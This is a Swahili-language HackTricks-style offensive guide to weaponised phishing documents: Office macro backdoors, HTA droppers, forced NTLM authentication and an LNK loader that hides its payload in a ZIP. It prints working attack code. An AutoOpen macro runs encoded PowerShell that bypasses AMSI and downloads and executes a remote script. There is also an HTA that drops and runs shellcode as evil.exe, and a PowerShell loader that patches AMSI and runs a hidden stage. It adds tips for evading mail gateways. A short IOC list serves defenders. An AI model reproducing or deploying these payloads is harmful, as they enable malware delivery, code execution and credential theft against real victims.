# Faili na Nyaraka za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uhakiki wa data za faili kabla ya kufungua faili. Uhakiki wa data hufanywa kwa njia ya utambuzi wa muundo wa data, kwa mujibu wa kiwango cha OfficeOpenXML. Ikiwa kosa lolote litatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kwa kawaida, faili za Word zinazobeba macros hutumia extension ya `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha extension ya faili na bado kuhifadhi uwezo wake wa kutekeleza macros.\
Kwa mfano, faili ya RTF haiungi mkono macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
Mifumo ya ndani na taratibu sawa zinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni zipi extensions zitakazotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Faili za DOCX zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) ambazo zinajumuisha macros zinaweza pia “kutekeleza” macros.

### Kupakia Picha za Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha arbitrary code kutoka kwenye document.

#### Autoload functions

Kadri zinavyokuwa za kawaida zaidi, ndivyo AV inavyoweza kuzitambua.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mkono

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.

#### Extension ya Doc

Ukimaliza, chagua dropdown ya **Save as type**, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivyo kwa sababu **huwezi kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** kuhusu ugani unaowezesha macro **`.docm`** (kwa mfano, icon ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/baruapepe huvizuia kabisa). Kwa hiyo, **ugani wa kale `.doc` ndio suluhisho bora**.

#### Vyanzo vya Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows inayochanganya **HTML na lugha za scripting (k.m. VBScript na JScript)**. Inaunda kiolesura cha mtumiaji na inaendeshwa kama programu "iliyothibitishwa kabisa", bila vikwazo vya mfano wa usalama wa kivinjari.

HTA inaenzishwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imesakinishwa** pamoja na **Internet Explorer**, na kufanya **`mshta` inategemea IE**. Kwa hivyo ikiwa imeondolewa, HTA hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atazifungua (hata HTTP MitM?). Au mtumie mwathiriwa **anwani ya faili** zitakazowasababisha **authentication** tu kwa **ufunguaji wa folda.**

**Tazama mawazo haya na zaidi kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi kuiba tu hash au authentication pekee, bali pia unaweza **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zenye ufanisi mkubwa hutuma ZIP inayojumuisha nyaraka mbili halali za kupotosha (PDF/DOCX) na .lnk hatari. Mbinu ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya bytes ghafi za ZIP baada ya alama ya kipekee, na .lnk huitaibua na kuiendesha kabisa kwenye kumbukumbu.

Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:

1) Tambua ZIP ya asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na folda mzazi ya current working directory.
2) Soma bytes za ZIP na utafute marker uliowekwa kwenye msimbo (mfano, xFIQCV). Yote yanayofuata marker ni PowerShell payload iliyojazwa ndani.
3) Nakili ZIP hadi %ProgramData%, itolee hapo (extract), kisha fungua .docx ya kupotosha ili ionekane halali.
4) Bypass AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate hatua inayofuata (kwa mfano, ondoa tabia zote za #) na uitekeleze kwenye kumbukumbu.

Mfano wa skeleton ya PowerShell ili kuibua na kuendesha hatua iliyojazwa ndani:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Usambazaji mara nyingi unatumia vibamba vya subdomain vya PaaS vinavyoaminika (e.g., *.herokuapp.com) na unaweza gate payloads (kutumia ZIP zisizo hatari kulingana na IP/UA).
- Hatua inayofuata mara nyingi hu-decrypt base64/XOR shellcode na kuiendesha kupitia Reflection.Emit + VirtualAlloc ili kupunguza athari za diski.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control ili IE/Explorer au programu yoyote inayoiingiza ianze upya payload kiotomatiki. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files zenye kamba ya alama ya ASCII (e.g., xFIQCV) iliyoongezwa kwenye data ya archive.
- .lnk inayoorodhesha folda za mzazi/mtumiaji ili kupata ZIP na kufungua nyaraka ya kudanganya.
- Kuchezewa kwa AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Nyuzi za biashara zinazodumu muda mrefu zikimalizika kwa viungo vinavyoandikwa chini ya vikoa vya PaaS vinavyoaminika.

## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
